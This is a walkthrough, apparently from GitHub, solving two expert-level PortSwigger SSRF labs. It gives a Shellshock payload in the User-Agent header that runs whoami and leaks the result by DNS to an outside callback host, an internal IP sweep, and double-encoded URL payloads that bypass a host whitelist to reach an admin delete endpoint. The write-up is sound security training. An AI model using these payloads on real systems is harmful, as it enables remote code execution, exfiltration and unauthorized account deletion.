## Labs Covered

This write-up focuses on the following **EXPERT-level labs** from the PortSwigger Web Security Academy related to **Server-side request forgery (SSRF)**:

**6 Blind SSRF with Shellshock exploitation**  
<blockquote>
This lab demonstrates how to exploit SSRF vulnerabilities combined with the Shellshock bug to execute remote code.
</blockquote>

**7 SSRF with whitelist-based input filter**  
<blockquote>
This lab shows how attackers can bypass whitelist-based input filters to exploit SSRF vulnerabilities.
</blockquote>

---

### LAB 6 - Blind SSRF with Shellshock exploitation

### Lab Description

![image](https://github.com/user-attachments/assets/f6bab582-1107-4580-bb46-8b2138e7cab5)


### Solution

- I accessed the lab and clicked on a product.
- Using **Burp Suite**, I intercepted the request to analyze possible SSRF injection points.

### 2. **Using Collaborator Everywhere**

- Enabled the **Burp extension: Collaborator Everywhere**, which automatically injects payloads into headers like `User-Agent`, `Referer`, etc.
- Marked the lab as **in-scope** and browsed multiple pages to trigger different requests.
- The **Burp Collaborator** received DNS callbacks from `User-Agent` and `Referer` headers, confirming an SSRF and possible OAST vector.

![image](https://github.com/user-attachments/assets/b3a837e2-97b1-4905-83cf-bbe6b616b4b1)
---

## 3. **Preparing Shellshock Payload**

- As the lab required exploiting Shellshock, I searched online and found a [**Cloudflare blog**][(https://blog.cloudflare.com/inside-shellshock](https://blog.cloudflare.com/inside-shellshock/)/) detailing working payloads.


![image](https://github.com/user-attachments/assets/eca7791d-a9a1-4435-90b1-81d86db8e5aa)




#### Final Payload (used in `User-Agent`):

I replaced `/bin/eject` with `/bin/nslookup` because I wanted the DNS lookup for the domain which contained the result of whoami and added $(whoami) before the Burp collaborator URL to see the output in the collaborator window. This was the final payload:


```bash
() { :;}; /bin/nslookup $(whoami).<my-collaborator-id>.oastify.com
````

![image](https://github.com/user-attachments/assets/f969ba50-e0e3-4185-a7ab-772c078f3935)

---

## 4. **Identifying the Vulnerable Internal Host**

* Lab description hinted the vulnerable internal server was at:

  ```
  192.168.0.X:8080
  ```
* I crafted requests with the above payload in the `User-Agent` header and started a **Burp Intruder** attack on the `Referer` header to test:

  ```
  Referer: http://192.168.0.[1-255]:8080/
  ```

 ![image](https://github.com/user-attachments/assets/034c25ee-e285-4835-b098-50b4d75cac90)


Setting Payload attack on intruder

![image](https://github.com/user-attachments/assets/2c588c11-1929-4216-8a7c-166648dd7170)

While my intruder attack was running, I received a callback on the burp collaborator along with the OS user which when I submitted in the application solved the lab

![image](https://github.com/user-attachments/assets/df014929-f46b-4b0c-9152-b2fdaf002d4f)



![image](https://github.com/user-attachments/assets/9c3ef8df-b721-4816-b777-f526bd48236a)






---

### LAB 7 - SSRF with whitelist-based input filter

### Lab Description

![image](https://github.com/user-attachments/assets/35444ae3-fcde-4d5c-9605-8b2e6408a18f)


### Solution


#### 1. **Initial Attempt – Direct Access Blocked**

- I intercepted the **Check Stock** request and replaced the `stockApi` parameter value with:
```

http://localhost/admin

```
- The server responded with:
```

External stock check must be stock.weliketoshop.net

```


![image](https://github.com/user-attachments/assets/f547eeee-02eb-4fd0-82eb-49f21354b41a)



- This confirmed that the application was enforcing a domain whitelist.

---

#### 2. **Testing With Whitelisted Domain**

- I tried accessing:
```
 http://stock.weliketoshop.net/admin

```

![image](https://github.com/user-attachments/assets/37b68c88-aa13-4a3d-b0fb-d443c76b9f78)

- Got a **500 Internal Server Error**, suggesting the request reached the internal service but was misconfigured or incomplete.

---

#### 3. **Bypassing the Whitelist Using URL Parser Confusion**

##### 3.1. **Injecting a Username Before the Host**

- I tested:
```

http://admin@stock.weliketoshop.net/

```

![image](https://github.com/user-attachments/assets/e3f29e10-10dd-4722-8bbb-eb6fa884fef7)

- Server responded with 500 — good sign. The app accepted the format.

  ![image](https://github.com/user-attachments/assets/9b192089-2411-4cf0-8767-b8c325f813b0)


##### 3.2. **Using Fragment Injection With `#`**

- I tested:
```

http://admin#@stock.weliketoshop.net/

```
- The server responded with:
```

External stock check host must be stock.weliketoshop.net

```

![image](https://github.com/user-attachments/assets/f22b8c4b-b5de-474d-abd1-b6be3b453c63)

- This implied the URL parser was seeing `admin` as the host and ignoring the rest (after `#`) as a fragment.

##### 3.3. **Trying URL Encoding**

- I encoded the `#` as `%23`:
```

http://admin%23@stock.weliketoshop.net

```
- Still failed — the filter likely decoded it once.

##### 3.4. **Double URL Encoding**

- I double-encoded `#` as `%2523`:
```

http://admin%2523@stock.weliketoshop.net

```

![image](https://github.com/user-attachments/assets/f02e65b7-ab4d-4b70-90cb-89e9287ad7e7)

- Server returned **500**, indicating that parsing was bypassed and the request was accepted.

---

#### 4. **Injecting `localhost`**

- Since `admin` wasn’t the goal, I replaced it with `localhost`:
```

http://localhost%2523@stock.weliketoshop.net

```

![image](https://github.com/user-attachments/assets/9200e67f-c2ce-484e-91a6-c294bf494d1c)

- This triggered a `200 OK` response and revealed the `/admin` path in the response body.

---

##### 5. **Accessing the Admin Interface**

- Appended `/admin` to the URL:
```

http://localhost%2523@stock.weliketoshop.net/admin

```

![image](https://github.com/user-attachments/assets/c722989f-df57-495c-818e-ce18f52f14a6)

- This revealed the deletion endpoint:
```

/admin/delete?username=carlos

```

![image](https://github.com/user-attachments/assets/d69cb3ff-9bd8-4b54-9a9a-e605800ca9e4)



##### 6. **Final Payload to Delete User**

- I submitted the final payload in the `stockApi` parameter:
```

http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos

```
- This triggered the deletion of `carlos`.

- ![image](https://github.com/user-attachments/assets/b8c32e8e-f9e2-4c00-b23e-f160464485b9)

  And lab is solved after deleting Carlos user

![image](https://github.com/user-attachments/assets/32953fcf-2525-4c78-9c1a-fff07a914a76)


---

